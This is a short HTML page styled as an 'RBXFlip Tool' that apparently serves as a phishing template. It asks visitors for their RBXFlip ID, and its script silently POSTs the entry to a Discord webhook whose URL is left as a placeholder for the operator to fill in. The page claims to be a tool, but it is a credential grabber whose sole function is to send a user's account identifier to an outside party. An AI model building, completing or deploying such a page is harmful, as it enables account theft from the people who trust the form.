<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBXFlip Tool</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <form>
      <input id="webhookName" placeholder="Leave this blank">
      <input id="avatarUrl" placeholder="Leave this blank">
      <input id="yourMessage" placeholder="Enter your RBXFlip ID">
      <input type="submit" onclick="sendMessage()"></input>
    </form>
  </body>

  <script>

    var wname = document.getElementById('webhookName')
    var wavatar = document.getElementById('avatarUrl')
    var ymessage = document.getElementById('yourMessage')


    function sendMessage() {
      var request = new XMLHttpRequest();
      request.open("POST", "putyourdiscordwebhookhere");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: wname.value,
        avatar_url: wavatar.value,
        content: ymessage.value
      }


      request.send(JSON.stringify(params));
    }
  </script>
</html>
